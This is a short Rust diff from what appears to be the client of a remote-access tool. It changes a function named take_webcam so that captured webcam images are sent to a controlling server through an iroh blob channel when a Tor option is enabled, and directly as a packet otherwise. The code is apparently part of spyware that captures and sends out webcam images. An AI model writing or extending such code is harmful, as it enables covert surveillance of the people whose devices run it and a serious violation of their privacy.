@@ -15,6 +15,14 @@ pub async fn take_webcam() {
         match handle.join() {
             Ok(Some(data)) => {
                 tokio::spawn(async move {
+                    if crate::service::config::get_config().use_tor {
+                        if let Some(blob_info) = crate::features::iroh::add_blob(data.clone(), "webcam.jpg".to_string(), common::packets::BlobContext::Webcam).await {
+                            if let Err(e) = send_packet(ServerboundPacket::IrohBlobReady(blob_info)).await {
+                                eprintln!("❌ Failed to send iroh blob info: {}", e);
+                            }
+                            return;
+                        }
+                    }
                     if let Err(e) = send_packet(ServerboundPacket::WebcamResult(data)).await {
                         eprintln!("Failed to send webcam packet: {}", e);
                     }
